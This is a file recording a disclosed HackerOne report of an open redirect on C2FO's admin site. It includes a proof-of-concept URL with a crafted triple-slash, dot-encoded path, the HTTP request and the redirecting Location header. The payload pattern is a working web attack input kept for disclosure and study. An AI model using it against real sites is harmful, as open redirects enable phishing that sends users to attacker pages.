@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/39198
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/bobrov
+ReportedTo:C2FO(c2fo)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:29.10.2016 16:08:53
+
+Summary:
+
+PoC (FireFox):
+https://admin.c2fo.com///www.google.com/%2e%2e
+
+HTTP Request:
+GET ///www.google.com/%2e%2e HTTP/1.1
+Host: admin.c2fo.com
+
+HTTP Response:
+Location: //www.google.com/%2e%2e/
